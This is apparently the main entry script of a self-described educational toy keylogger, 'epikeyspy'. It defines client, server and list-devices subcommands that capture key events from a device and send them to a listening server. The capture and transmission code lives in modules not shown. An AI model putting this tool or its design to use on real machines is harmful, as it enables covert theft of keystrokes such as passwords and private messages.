from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser

from .client import client_loop
from .devices import list_supported_devices
from .server import server_loop

# Main parser
parser = ArgumentParser(prog='epikeyspy',
                        description='A toy keylogger **EDUCATIONAL PURPOSES ONLY**',
                        exit_on_error=True)

subparsers = parser.add_subparsers(required=True, dest='command')

# 'client' command parser
client_subpar = subparsers.add_parser('client',
                                      description='Run the keylogger client',
                                      formatter_class=ArgumentDefaultsHelpFormatter)
client_subpar.add_argument('server', help='the server to communicate with')
client_subpar.add_argument('--device',
                           metavar='dev',
                           help='ID of the device to spy (obtained using `list-devices` subcommand',
                           type=int,
                           default=0)

client_subpar_raw_group = client_subpar.add_mutually_exclusive_group()
client_subpar_raw_group.add_argument('--raw', help='send raw data', action='store_true', dest='raw', default=True)
client_subpar_raw_group.add_argument('--no-raw',
                                     help='send interpreted events',
                                     action='store_false',
                                     dest='raw',
                                     default=False)

# 'server' command parser
server_subpar = subparsers.add_parser('server',
                                      description='Run the keylogger server',
                                      formatter_class=ArgumentDefaultsHelpFormatter)
server_subpar.add_argument('-a', '--address', help='the address to use', type=str, default='0.0.0.0')
server_subpar.add_argument('-p', '--port', help='the port to use', type=int, default=9999)

# 'list-devices' command parser
listdev_subpar = subparsers.add_parser('list-devices',
                                       description='List all supported devices',
                                       formatter_class=ArgumentDefaultsHelpFormatter)

args = parser.parse_args()

if args.command == 'client':
    try:
        client_loop(args.device, args.server, args.raw)
    except KeyboardInterrupt:
        pass
elif args.command == 'server':
    server_loop(args.address, args.port)
elif args.command == 'list-devices':
    devices = list_supported_devices()
    if not devices:
        print('No supported device found')
    else:
        print(f'{devices[0]} (default)')
